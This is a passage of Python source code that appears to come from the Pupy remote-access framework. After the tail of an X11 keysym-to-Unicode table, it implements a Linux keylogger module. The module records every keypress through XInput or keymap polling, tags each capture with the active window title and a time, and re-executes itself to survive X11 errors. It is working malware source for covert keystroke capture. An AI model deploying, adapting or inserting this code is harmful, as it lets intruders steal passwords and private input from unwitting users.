    0x0ac6: u'\u215e', 0x0ac9: u'\u2122', 0x0aca: u'\u2613', 0x0acc: u'\u25c1', 0x0acd: u'\u25b7',
    0x0ace: u'\u25cb', 0x0acf: u'\u25af', 0x0ad0: u'\u2018', 0x0ad1: u'\u2019', 0x0ad2: u'\u201c',
    0x0ad3: u'\u201d', 0x0ad4: u'\u211e', 0x0ad6: u'\u2032', 0x0ad7: u'\u2033', 0x0ad9: u'\u271d',
    0x0adb: u'\u25ac', 0x0adc: u'\u25c0', 0x0add: u'\u25b6', 0x0ade: u'\u25cf', 0x0adf: u'\u25ae',
    0x0ae0: u'\u25e6', 0x0ae1: u'\u25ab', 0x0ae2: u'\u25ad', 0x0ae3: u'\u25b3', 0x0ae4: u'\u25bd',
    0x0ae5: u'\u2606', 0x0ae6: u'\u2022', 0x0ae7: u'\u25aa', 0x0ae8: u'\u25b2', 0x0ae9: u'\u25bc',
    0x0aea: u'\u261c', 0x0aeb: u'\u261e', 0x0aec: u'\u2663', 0x0aed: u'\u2666', 0x0aee: u'\u2665',
    0x0af0: u'\u2720', 0x0af1: u'\u2020', 0x0af2: u'\u2021', 0x0af3: u'\u2713', 0x0af4: u'\u2717',
    0x0af5: u'\u266f', 0x0af6: u'\u266d', 0x0af7: u'\u2642', 0x0af8: u'\u2640', 0x0af9: u'\u260e',
    0x0afa: u'\u2315', 0x0afb: u'\u2117', 0x0afc: u'\u2038', 0x0afd: u'\u201a', 0x0afe: u'\u201e',
    0x0ba3: u'\u003c', 0x0ba6: u'\u003e', 0x0ba8: u'\u2228', 0x0ba9: u'\u2227', 0x0bc0: u'\u00af',
    0x0bc2: u'\u22a5', 0x0bc3: u'\u2229', 0x0bc4: u'\u230a', 0x0bc6: u'\u005f', 0x0bca: u'\u2218',
    0x0bcc: u'\u2395', 0x0bce: u'\u22a4', 0x0bcf: u'\u25cb', 0x0bd3: u'\u2308', 0x0bd6: u'\u222a',
    0x0bd8: u'\u2283', 0x0bda: u'\u2282', 0x0bdc: u'\u22a2', 0x0bfc: u'\u22a3', 0x0cdf: u'\u2017',
    0x0ce0: u'\u05d0', 0x0ce1: u'\u05d1', 0x0ce1: u'\u05d1', 0x0ce2: u'\u05d2', 0x0ce2: u'\u05d2',
    0x0ce3: u'\u05d3', 0x0ce3: u'\u05d3', 0x0ce4: u'\u05d4', 0x0ce5: u'\u05d5', 0x0ce6: u'\u05d6',
    0x0ce6: u'\u05d6', 0x0ce7: u'\u05d7', 0x0ce7: u'\u05d7', 0x0ce8: u'\u05d8', 0x0ce8: u'\u05d8',
    0x0ce9: u'\u05d9', 0x0cea: u'\u05da', 0x0ceb: u'\u05db', 0x0cec: u'\u05dc', 0x0ced: u'\u05dd',
    0x0cee: u'\u05de', 0x0cef: u'\u05df', 0x0cf0: u'\u05e0', 0x0cf1: u'\u05e1', 0x0cf1: u'\u05e1',
    0x0cf2: u'\u05e2', 0x0cf3: u'\u05e3', 0x0cf4: u'\u05e4', 0x0cf5: u'\u05e5', 0x0cf5: u'\u05e5',
    0x0cf6: u'\u05e6', 0x0cf6: u'\u05e6', 0x0cf7: u'\u05e7', 0x0cf7: u'\u05e7', 0x0cf8: u'\u05e8',
    0x0cf9: u'\u05e9', 0x0cfa: u'\u05ea', 0x0cfa: u'\u05ea', 0x0da1: u'\u0e01', 0x0da2: u'\u0e02',
    0x0da3: u'\u0e03', 0x0da4: u'\u0e04', 0x0da5: u'\u0e05', 0x0da6: u'\u0e06', 0x0da7: u'\u0e07',
    0x0da8: u'\u0e08', 0x0da9: u'\u0e09', 0x0daa: u'\u0e0a', 0x0dab: u'\u0e0b', 0x0dac: u'\u0e0c',
    0x0dad: u'\u0e0d', 0x0dae: u'\u0e0e', 0x0daf: u'\u0e0f', 0x0db0: u'\u0e10', 0x0db1: u'\u0e11',
    0x0db2: u'\u0e12', 0x0db3: u'\u0e13', 0x0db4: u'\u0e14', 0x0db5: u'\u0e15', 0x0db6: u'\u0e16',
    0x0db7: u'\u0e17', 0x0db8: u'\u0e18', 0x0db9: u'\u0e19', 0x0dba: u'\u0e1a', 0x0dbb: u'\u0e1b',
    0x0dbc: u'\u0e1c', 0x0dbd: u'\u0e1d', 0x0dbe: u'\u0e1e', 0x0dbf: u'\u0e1f', 0x0dc0: u'\u0e20',
    0x0dc1: u'\u0e21', 0x0dc2: u'\u0e22', 0x0dc3: u'\u0e23', 0x0dc4: u'\u0e24', 0x0dc5: u'\u0e25',
    0x0dc6: u'\u0e26', 0x0dc7: u'\u0e27', 0x0dc8: u'\u0e28', 0x0dc9: u'\u0e29', 0x0dca: u'\u0e2a',
    0x0dcb: u'\u0e2b', 0x0dcc: u'\u0e2c', 0x0dcd: u'\u0e2d', 0x0dce: u'\u0e2e', 0x0dcf: u'\u0e2f',
    0x0dd0: u'\u0e30', 0x0dd1: u'\u0e31', 0x0dd2: u'\u0e32', 0x0dd3: u'\u0e33', 0x0dd4: u'\u0e34',
    0x0dd5: u'\u0e35', 0x0dd6: u'\u0e36', 0x0dd7: u'\u0e37', 0x0dd8: u'\u0e38', 0x0dd9: u'\u0e39',
    0x0dda: u'\u0e3a', 0x0ddf: u'\u0e3f', 0x0de0: u'\u0e40', 0x0de1: u'\u0e41', 0x0de2: u'\u0e42',
    0x0de3: u'\u0e43', 0x0de4: u'\u0e44', 0x0de5: u'\u0e45', 0x0de6: u'\u0e46', 0x0de7: u'\u0e47',
    0x0de8: u'\u0e48', 0x0de9: u'\u0e49', 0x0dea: u'\u0e4a', 0x0deb: u'\u0e4b', 0x0dec: u'\u0e4c',
    0x0ded: u'\u0e4d', 0x0df0: u'\u0e50', 0x0df1: u'\u0e51', 0x0df2: u'\u0e52', 0x0df3: u'\u0e53',
    0x0df4: u'\u0e54', 0x0df5: u'\u0e55', 0x0df6: u'\u0e56', 0x0df7: u'\u0e57', 0x0df8: u'\u0e58',
    0x0df9: u'\u0e59', 0x0ea1: u'\u3131', 0x0ea2: u'\u3132', 0x0ea3: u'\u3133', 0x0ea4: u'\u3134',
    0x0ea5: u'\u3135', 0x0ea6: u'\u3136', 0x0ea7: u'\u3137', 0x0ea8: u'\u3138', 0x0ea9: u'\u3139',
    0x0eaa: u'\u313a', 0x0eab: u'\u313b', 0x0eac: u'\u313c', 0x0ead: u'\u313d', 0x0eae: u'\u313e',
    0x0eaf: u'\u313f', 0x0eb0: u'\u3140', 0x0eb1: u'\u3141', 0x0eb2: u'\u3142', 0x0eb3: u'\u3143',
    0x0eb4: u'\u3144', 0x0eb5: u'\u3145', 0x0eb6: u'\u3146', 0x0eb7: u'\u3147', 0x0eb8: u'\u3148',
    0x0eb9: u'\u3149', 0x0eba: u'\u314a', 0x0ebb: u'\u314b', 0x0ebc: u'\u314c', 0x0ebd: u'\u314d',
    0x0ebe: u'\u314e', 0x0ebf: u'\u314f', 0x0ec0: u'\u3150', 0x0ec1: u'\u3151', 0x0ec2: u'\u3152',
    0x0ec3: u'\u3153', 0x0ec4: u'\u3154', 0x0ec5: u'\u3155', 0x0ec6: u'\u3156', 0x0ec7: u'\u3157',
    0x0ec8: u'\u3158', 0x0ec9: u'\u3159', 0x0eca: u'\u315a', 0x0ecb: u'\u315b', 0x0ecc: u'\u315c',
    0x0ecd: u'\u315d', 0x0ece: u'\u315e', 0x0ecf: u'\u315f', 0x0ed0: u'\u3160', 0x0ed1: u'\u3161',
    0x0ed2: u'\u3162', 0x0ed3: u'\u3163', 0x0ed4: u'\u11a8', 0x0ed5: u'\u11a9', 0x0ed6: u'\u11aa',
    0x0ed7: u'\u11ab', 0x0ed8: u'\u11ac', 0x0ed9: u'\u11ad', 0x0eda: u'\u11ae', 0x0edb: u'\u11af',
    0x0edc: u'\u11b0', 0x0edd: u'\u11b1', 0x0ede: u'\u11b2', 0x0edf: u'\u11b3', 0x0ee0: u'\u11b4',
    0x0ee1: u'\u11b5', 0x0ee2: u'\u11b6', 0x0ee3: u'\u11b7', 0x0ee4: u'\u11b8', 0x0ee5: u'\u11b9',
    0x0ee6: u'\u11ba', 0x0ee7: u'\u11bb', 0x0ee8: u'\u11bc', 0x0ee9: u'\u11bd', 0x0eea: u'\u11be',
    0x0eeb: u'\u11bf', 0x0eec: u'\u11c0', 0x0eed: u'\u11c1', 0x0eee: u'\u11c2', 0x0eef: u'\u316d',
    0x0ef0: u'\u3171', 0x0ef1: u'\u3178', 0x0ef2: u'\u317f', 0x0ef3: u'\u3181', 0x0ef4: u'\u3184',
    0x0ef5: u'\u3186', 0x0ef6: u'\u318d', 0x0ef7: u'\u318e', 0x0ef8: u'\u11eb', 0x0ef9: u'\u11f0',
    0x0efa: u'\u11f9', 0x0eff: u'\u20a9', 0x13bc: u'\u0152', 0x13bd: u'\u0153', 0x13be: u'\u0178',
    0x20a0: u'\u20a0', 0x20a1: u'\u20a1', 0x20a2: u'\u20a2', 0x20a3: u'\u20a3', 0x20a4: u'\u20a4',
    0x20a5: u'\u20a5', 0x20a6: u'\u20a6', 0x20a7: u'\u20a7', 0x20a8: u'\u20a8', 0x20a9: u'\u20a9',
    0x20aa: u'\u20aa', 0x20ab: u'\u20ab', 0x20ac: u'\u20ac', 0xfe50: u'\u0300', 0xfe51: u'\u0301',
    0xfe52: u'\u0302', 0xfe53: u'\u0303', 0xfe54: u'\u0304', 0xfe55: u'\u0306', 0xfe56: u'\u0307',
    0xfe57: u'\u0308', 0xfe58: u'\u030a', 0xfe59: u'\u030b', 0xfe5a: u'\u030c', 0xfe5b: u'\u0327',
    0xfe5c: u'\u0328', 0xfe5d: u'\u0345', 0xfe5e: u'\u3099', 0xfe5f: u'\u309a', 0xff08: u'\u0008',
    0xff09: u'\u0009', 0xff0a: u'\u000a', 0xff0b: u'\u000b', 0xff0d: u'\u000d', 0xff13: u'\u0013',
    0xff14: u'\u0014', 0xff15: u'\u0015', 0xff1b: u'\u001b', 0xff80: u'\u0020', 0xff89: u'\u0009',
    0xff8d: u'\u000d', 0xffaa: u'\u002a', 0xffab: u'\u002b', 0xffac: u'\u002c', 0xffad: u'\u002d',
    0xffae: u'\u002e', 0xffaf: u'\u002f', 0xffb0: u'\u0030', 0xffb1: u'\u0031', 0xffb2: u'\u0032',
    0xffb3: u'\u0033', 0xffb4: u'\u0034', 0xffb5: u'\u0035', 0xffb6: u'\u0036', 0xffb7: u'\u0037',
    0xffb8: u'\u0038', 0xffb9: u'\u0039', 0xffbd: u'\u003d', 0x06ad: u'\u0491', 0x06bd: u'\u0490',
    0x14a2: u'\u0587', 0x14a3: u'\u0589', 0x14a4: u'\u0029', 0x14a5: u'\u0028', 0x14a6: u'\u00bb',
    0x14a7: u'\u00ab', 0x14a8: u'\u2014', 0x14a9: u'\u002e', 0x14aa: u'\u055d', 0x14ab: u'\u002c',
    0x14ac: u'\u2013', 0x14ad: u'\u058a', 0x14ae: u'\u2026', 0x14af: u'\u055c', 0x14b0: u'\u055b',
    0x14b1: u'\u055e', 0x14b2: u'\u0531', 0x14b3: u'\u0561', 0x14b4: u'\u0532', 0x14b5: u'\u0562',
    0x14b6: u'\u0533', 0x14b7: u'\u0563', 0x14b8: u'\u0534', 0x14b9: u'\u0564', 0x14ba: u'\u0535',
    0x14bb: u'\u0565', 0x14bc: u'\u0536', 0x14bd: u'\u0566', 0x14be: u'\u0537', 0x14bf: u'\u0567',
    0x14c0: u'\u0538', 0x14c1: u'\u0568', 0x14c2: u'\u0539', 0x14c3: u'\u0569', 0x14c4: u'\u053a',
    0x14c5: u'\u056a', 0x14c6: u'\u053b', 0x14c7: u'\u056b', 0x14c8: u'\u053c', 0x14c9: u'\u056c',
    0x14ca: u'\u053d', 0x14cb: u'\u056d', 0x14cc: u'\u053e', 0x14cd: u'\u056e', 0x14ce: u'\u053f',
    0x14cf: u'\u056f', 0x14d0: u'\u0540', 0x14d1: u'\u0570', 0x14d2: u'\u0541', 0x14d3: u'\u0571',
    0x14d4: u'\u0542', 0x14d5: u'\u0572', 0x14d6: u'\u0543', 0x14d7: u'\u0573', 0x14d8: u'\u0544',
    0x14d9: u'\u0574', 0x14da: u'\u0545', 0x14db: u'\u0575', 0x14dc: u'\u0546', 0x14dd: u'\u0576',
    0x14de: u'\u0547', 0x14df: u'\u0577', 0x14e0: u'\u0548', 0x14e1: u'\u0578', 0x14e2: u'\u0549',
    0x14e3: u'\u0579', 0x14e4: u'\u054a', 0x14e5: u'\u057a', 0x14e6: u'\u054b', 0x14e7: u'\u057b',
    0x14e8: u'\u054c', 0x14e9: u'\u057c', 0x14ea: u'\u054d', 0x14eb: u'\u057d', 0x14ec: u'\u054e',
    0x14ed: u'\u057e', 0x14ee: u'\u054f', 0x14ef: u'\u057f', 0x14f0: u'\u0550', 0x14f1: u'\u0580',
    0x14f2: u'\u0551', 0x14f3: u'\u0581', 0x14f4: u'\u0552', 0x14f5: u'\u0582', 0x14f6: u'\u0553',
    0x14f7: u'\u0583', 0x14f8: u'\u0554', 0x14f9: u'\u0584', 0x14fa: u'\u0555', 0x14fb: u'\u0585',
    0x14fc: u'\u0556', 0x14fd: u'\u0586', 0x14fe: u'\u055a', 0x14ff: u'\u00a7', 0x15d0: u'\u10d0',
    0x15d1: u'\u10d1', 0x15d2: u'\u10d2', 0x15d3: u'\u10d3', 0x15d4: u'\u10d4', 0x15d5: u'\u10d5',
    0x15d6: u'\u10d6', 0x15d7: u'\u10d7', 0x15d8: u'\u10d8', 0x15d9: u'\u10d9', 0x15da: u'\u10da',
    0x15db: u'\u10db', 0x15dc: u'\u10dc', 0x15dd: u'\u10dd', 0x15de: u'\u10de', 0x15df: u'\u10df',
    0x15e0: u'\u10e0', 0x15e1: u'\u10e1', 0x15e2: u'\u10e2', 0x15e3: u'\u10e3', 0x15e4: u'\u10e4',
    0x15e5: u'\u10e5', 0x15e6: u'\u10e6', 0x15e7: u'\u10e7', 0x15e8: u'\u10e8', 0x15e9: u'\u10e9',
    0x15ea: u'\u10ea', 0x15eb: u'\u10eb', 0x15ec: u'\u10ec', 0x15ed: u'\u10ed', 0x15ee: u'\u10ee',
    0x15ef: u'\u10ef', 0x15f0: u'\u10f0', 0x15f1: u'\u10f1', 0x15f2: u'\u10f2', 0x15f3: u'\u10f3',
    0x15f4: u'\u10f4', 0x15f5: u'\u10f5', 0x15f6: u'\u10f6', 0x12a1: u'\u1e02', 0x12a2: u'\u1e03',
    0x12a6: u'\u1e0a', 0x12a8: u'\u1e80', 0x12aa: u'\u1e82', 0x12ab: u'\u1e0b', 0x12ac: u'\u1ef2',
    0x12b0: u'\u1e1e', 0x12b1: u'\u1e1f', 0x12b4: u'\u1e40', 0x12b5: u'\u1e41', 0x12b7: u'\u1e56',
    0x12b8: u'\u1e81', 0x12b9: u'\u1e57', 0x12ba: u'\u1e83', 0x12bb: u'\u1e60', 0x12bc: u'\u1ef3',
    0x12bd: u'\u1e84', 0x12be: u'\u1e85', 0x12bf: u'\u1e61', 0x12d0: u'\u0174', 0x12d7: u'\u1e6a',
    0x12de: u'\u0176', 0x12f0: u'\u0175', 0x12f7: u'\u1e6b', 0x12fe: u'\u0177', 0x0590: u'\u06f0',
    0x0591: u'\u06f1', 0x0592: u'\u06f2', 0x0593: u'\u06f3', 0x0594: u'\u06f4', 0x0595: u'\u06f5',
    0x0596: u'\u06f6', 0x0597: u'\u06f7', 0x0598: u'\u06f8', 0x0599: u'\u06f9', 0x05a5: u'\u066a',
    0x05a6: u'\u0670', 0x05a7: u'\u0679', 0x05a8: u'\u067e', 0x05a9: u'\u0686', 0x05aa: u'\u0688',
    0x05ab: u'\u0691', 0x05ae: u'\u06d4', 0x05b0: u'\u0660', 0x05b1: u'\u0661', 0x05b2: u'\u0662',
    0x05b3: u'\u0663', 0x05b4: u'\u0664', 0x05b5: u'\u0665', 0x05b6: u'\u0666', 0x05b7: u'\u0667',
    0x05b8: u'\u0668', 0x05b9: u'\u0669', 0x05f3: u'\u0653', 0x05f4: u'\u0654', 0x05f5: u'\u0655',
    0x05f6: u'\u0698', 0x05f7: u'\u06a4', 0x05f8: u'\u06a9', 0x05f9: u'\u06af', 0x05fa: u'\u06ba',
    0x05fb: u'\u06be', 0x05fc: u'\u06cc', 0x05fd: u'\u06d2', 0x05fe: u'\u06c1', 0x0680: u'\u0492',
    0x0681: u'\u0496', 0x0682: u'\u049a', 0x0683: u'\u049c', 0x0684: u'\u04a2', 0x0685: u'\u04ae',
    0x0686: u'\u04b0', 0x0687: u'\u04b2', 0x0688: u'\u04b6', 0x0689: u'\u04b8', 0x068a: u'\u04ba',
    0x068c: u'\u04d8', 0x068d: u'\u04e2', 0x068e: u'\u04e8', 0x068f: u'\u04ee', 0x0690: u'\u0493',
    0x0691: u'\u0497', 0x0692: u'\u049b', 0x0693: u'\u049d', 0x0694: u'\u04a3', 0x0695: u'\u04af',
    0x0696: u'\u04b1', 0x0697: u'\u04b3', 0x0698: u'\u04b7', 0x0699: u'\u04b9', 0x069a: u'\u04bb',
    0x069c: u'\u04d9', 0x069d: u'\u04e3', 0x069e: u'\u04e9', 0x069f: u'\u04ef', 0x16a3: u'\u1e8a',
    0x16a6: u'\u012c', 0x16a9: u'\u01b5', 0x16aa: u'\u01e6', 0x16af: u'\u019f', 0x16b3: u'\u1e8b',
    0x16b6: u'\u012d', 0x16b9: u'\u01b6', 0x16ba: u'\u01e7', 0x16bd: u'\u01d2', 0x16bf: u'\u0275',
    0x16c6: u'\u018f', 0x16f6: u'\u0259', 0x16d1: u'\u1e36', 0x16e1: u'\u1e37', 0x1ea0: u'\u1ea0',
    0x1ea1: u'\u1ea1', 0x1ea2: u'\u1ea2', 0x1ea3: u'\u1ea3', 0x1ea4: u'\u1ea4', 0x1ea5: u'\u1ea5',
    0x1ea6: u'\u1ea6', 0x1ea7: u'\u1ea7', 0x1ea8: u'\u1ea8', 0x1ea9: u'\u1ea9', 0x1eaa: u'\u1eaa',
    0x1eab: u'\u1eab', 0x1eac: u'\u1eac', 0x1ead: u'\u1ead', 0x1eae: u'\u1eae', 0x1eaf: u'\u1eaf',
    0x1eb0: u'\u1eb0', 0x1eb1: u'\u1eb1', 0x1eb2: u'\u1eb2', 0x1eb3: u'\u1eb3', 0x1eb4: u'\u1eb4',
    0x1eb5: u'\u1eb5', 0x1eb6: u'\u1eb6', 0x1eb7: u'\u1eb7', 0x1eb8: u'\u1eb8', 0x1eb9: u'\u1eb9',
    0x1eba: u'\u1eba', 0x1ebb: u'\u1ebb', 0x1ebc: u'\u1ebc', 0x1ebd: u'\u1ebd', 0x1ebe: u'\u1ebe',
    0x1ebf: u'\u1ebf', 0x1ec0: u'\u1ec0', 0x1ec1: u'\u1ec1', 0x1ec2: u'\u1ec2', 0x1ec3: u'\u1ec3',
    0x1ec4: u'\u1ec4', 0x1ec5: u'\u1ec5', 0x1ec6: u'\u1ec6', 0x1ec7: u'\u1ec7', 0x1ec8: u'\u1ec8',
    0x1ec9: u'\u1ec9', 0x1eca: u'\u1eca', 0x1ecb: u'\u1ecb', 0x1ecc: u'\u1ecc', 0x1ecd: u'\u1ecd',
    0x1ece: u'\u1ece', 0x1ecf: u'\u1ecf', 0x1ed0: u'\u1ed0', 0x1ed1: u'\u1ed1', 0x1ed2: u'\u1ed2',
    0x1ed3: u'\u1ed3', 0x1ed4: u'\u1ed4', 0x1ed5: u'\u1ed5', 0x1ed6: u'\u1ed6', 0x1ed7: u'\u1ed7',
    0x1ed8: u'\u1ed8', 0x1ed9: u'\u1ed9', 0x1eda: u'\u1eda', 0x1edb: u'\u1edb', 0x1edc: u'\u1edc',
    0x1edd: u'\u1edd', 0x1ede: u'\u1ede', 0x1edf: u'\u1edf', 0x1ee0: u'\u1ee0', 0x1ee1: u'\u1ee1',
    0x1ee2: u'\u1ee2', 0x1ee3: u'\u1ee3', 0x1ee4: u'\u1ee4', 0x1ee5: u'\u1ee5', 0x1ee6: u'\u1ee6',
    0x1ee7: u'\u1ee7', 0x1ee8: u'\u1ee8', 0x1ee9: u'\u1ee9', 0x1eea: u'\u1eea', 0x1eeb: u'\u1eeb',
    0x1eec: u'\u1eec', 0x1eed: u'\u1eed', 0x1eee: u'\u1eee', 0x1eef: u'\u1eef', 0x1ef0: u'\u1ef0',
    0x1ef1: u'\u1ef1', 0x1ef4: u'\u1ef4', 0x1ef5: u'\u1ef5', 0x1ef6: u'\u1ef6', 0x1ef7: u'\u1ef7',
    0x1ef8: u'\u1ef8', 0x1ef9: u'\u1ef9', 0x1efa: u'\u01a0', 0x1efb: u'\u01a1', 0x1efc: u'\u01af',
    0x1efd: u'\u01b0', 0x1e9f: u'\u0303', 0x1ef2: u'\u0300', 0x1ef3: u'\u0301', 0x1efe: u'\u0309',
    0x1eff: u'\u0323', 0xfe60: u'\u0323', 0xfe61: u'\u0309', 0xfe62: u'\u031b',
}

def keysym_to_unicode(ks):
    return KEYSYM_TO_UNICODE_TABLE.get(ks)

def keylogger_start(event_id=None):
    if pupy.manager.active(KeyLogger):
        return False

    try:
        pupy.manager.create(KeyLogger, event_id=event_id)
    except:
        return 'no_x11'

    return True

def keylogger_dump():
    keylogger = pupy.manager.get(KeyLogger)
    if keylogger:
        return keylogger.results

def keylogger_stop():
    keylogger = pupy.manager.get(KeyLogger)
    if keylogger:
        pupy.manager.stop(KeyLogger)
        return keylogger.results

class NotAvailable(Exception):
    pass

class KeyLogger(pupy.Task):
    results_type = unicode

    def __init__(self, *args, **kwargs):
        super(KeyLogger, self).__init__(*args, **kwargs)
        global x11, xi

        self.daemon = False
        self.last_window = None
        self.last_clipboard = ""
        self.state = set()
        self.group = 0
        self.level = 0
        self.display = None
        self.x11 = x11
        self.xi = xi
        self._fatal_error_cb = self.fatal_error_handler
        self._error_cb = self.error_handler

        XkbEventCode = ct.c_int(0)
        XkbErrorReturn = ct.c_int(0)
        XkbMajorVersion = ct.c_int(1)
        XkbMinorVersion = ct.c_int(0)
        XkbReasonReturn = ct.c_int(0)

        if self.x11:
            self.display = x11.XkbOpenDisplay(
                os.environ.get('DISPLAY'),
                ct.pointer(XkbEventCode), ct.pointer(XkbErrorReturn),
                ct.pointer(XkbMajorVersion), ct.pointer(XkbMinorVersion),
                ct.pointer(XkbReasonReturn)
            )

        if self.display:
            self.x11.XSetErrorHandler(
                ct.CFUNCTYPE(ct.c_int, ct.c_void_p, ct.c_void_p)(self._error_cb)
            )
            self.x11.XSetIOErrorHandler(
                ct.CFUNCTYPE(ct.c_int, ct.c_void_p)(self._fatal_error_cb)
            )
        else:
            self.stop()
            raise NotAvailable()

    def _fatal_error_handler(self, error):
        self.stop()
        # Stupid libX11 will kill our application now, so let's try to reexec self
        try:
            executable = os.readlink('/proc/self/exe')
            args = open('/proc/self/cmdline').read().split('\x00')
        except:
            executable = sys.executable
            args = sys.argv

        os.execv(executable, args)
        return 0

    @property
    def fatal_error_handler(self):
        def __handler(error):
            return self._fatal_error_handler(error)

        return __handler

    @property
    def error_handler(self):
        def __handler(display, error):
            self.stop()

        return __handler

    def get_active_window(self):
        if not self.display:
            raise NotAvailable()

        window = ct.c_ulong()
        dw = ct.c_int()

        if not (self.x11.XGetInputFocus(
            self.display, ct.pointer(window), ct.pointer(dw)
        ) and window):
            return

        return window

    def get_window_title(self, window):
        if not self.display:
            raise NotAvailable()

        if not window:
            return

        hint = ClassHint()
        if self.x11.XGetClassHint(self.display, window, ct.pointer(hint)):
            return hint.name

    def get_active_window_title(self):
        return self.get_window_title(self.get_active_window())

    def append(self, k):
        if k:
            window = self.get_active_window_title()
            if self.last_window != window:
                self.last_window = window
                super(KeyLogger, self).append(
                    '\n{}: {}\n'.format(time(),str(window))
                )

            super(KeyLogger, self).append(k)

    def poll(self, callback, sleep_interval=.01):
        while self.active:
            sleep(sleep_interval)
            released, group, level = self.fetch_keys_poll()
            callback(self.to_keysyms(released, group, level))

    def xinput(self, callback):
        if not self.xi or not self.display:
            raise NotAvailable()

        xi_opcode = ct.c_int()
        xi_event = ct.c_int()
        xi_error = ct.c_int()

        if not self.x11.XQueryExtension(
            self.display,
            'XInputExtension',
            ct.pointer(xi_opcode), ct.pointer(xi_event), ct.pointer(xi_error)
        ):
            return NotAvailable()

        root_win = self.x11.XDefaultRootWindow(self.display)

        eventmask = XiEventMask()
        eventmask.deviceid = 0
        eventmask.mask_len = XiMaxLen()

        mask = (ct.c_byte*eventmask.mask_len)()
        XiSetMask(mask, 2)   # KeyPress
        # XiSetMask(mask, 3)   # KeyRelease
        # XiSetMask(mask, 14)   # RawKeyRelease
        eventmask.mask = ct.cast(ct.pointer(mask), ct.c_void_p)
        self.xi.XISelectEvents(self.display, root_win, ct.cast(ct.pointer(eventmask), ct.c_void_p), 1)
        self.x11.XMapWindow(self.display, root_win)
        self.x11.XSync(self.display, 0)

        while self.active:
            event = XEvent()
            self.x11.XNextEvent(self.display, ct.pointer(event))
            self.x11.XGetEventData(self.display, ct.pointer(event.cookie))
            if event.cookie.type == 35 and event.cookie.extension == xi_opcode.value:
                xievent = ct.cast(event.cookie.data, ct.POINTER(XIDeviceEvent)).contents
                callback(self.to_keysyms(
                    [xievent.detail],
                    xievent.group.effective,
                    xievent.mods.effective))

            self.x11.XFreeEventData(self.display, ct.pointer(event.cookie))

        self.x11.XDestroyWindow(self.display, root_win)

    def task(self):
        try:
            self.xinput(self.append)
        except NotAvailable:
            self.poll(self.append)

    def fetch_keys_poll(self):
        if not self.display:
            raise NotAvailable()

        state = XkbState()
        self.x11.XkbGetState(self.display, 0x0100, ct.pointer(state))

        group = ord(state.group)
        level = ord(state.locked_mods) & 1

        keyboard = ct.c_buffer(32)
        self.x11.XQueryKeymap(self.display, keyboard)
        current = set()

        for byte, value in enumerate(keyboard):
            value = ord(value)
            if not value:
                continue

            for bit in xrange(8):
                if value & (1 << bit):
                    current.add(byte*8 + bit)

        released = set(x for x in self.state if x not in current and x)

        self.state = current
        group, self.group = self.group, group
        level, self.level = self.level, level

        return released, group, level

    def to_keysyms(self, released, group, level):
        if not self.display:
            raise NotAvailable()

        keys = set()
        level = level & 1

        for k in set(released):
            # We incorrectly guess level here, but in 99% real life cases shift means level1
            # Also some things may not be available in group, so fallback to default one
            ks = self.x11.XkbKeycodeToKeysym(self.display, k, group, level)
            if not ks:
                ks = self.x11.XkbKeycodeToKeysym(self.display, k, 0, level)
            if not ks:
                ks = self.x11.XkbKeycodeToKeysym(self.display, k, 0, 0)

            if ((ks >> 8) & 0xFF) == 0xFE or ks in (0xffe2, 0xffe3, 0xffe5, 0xffe6):
                # Ignore group shifts and shift key info
                continue

            uks = keysym_to_unicode(ks)
            xk = keysym_to_XK(ks)
            if xk:
                keys.add(u'<{}>'.format(xk))
            elif uks:
                keys.add(uks)
            elif ks:
                keys.add(u'{{{}}}'.format(ks))

        return u''.join(keys)

    def __del__(self):
        if self.display:
            self.x11.XCloseDisplay(self.display)
            self.display = None
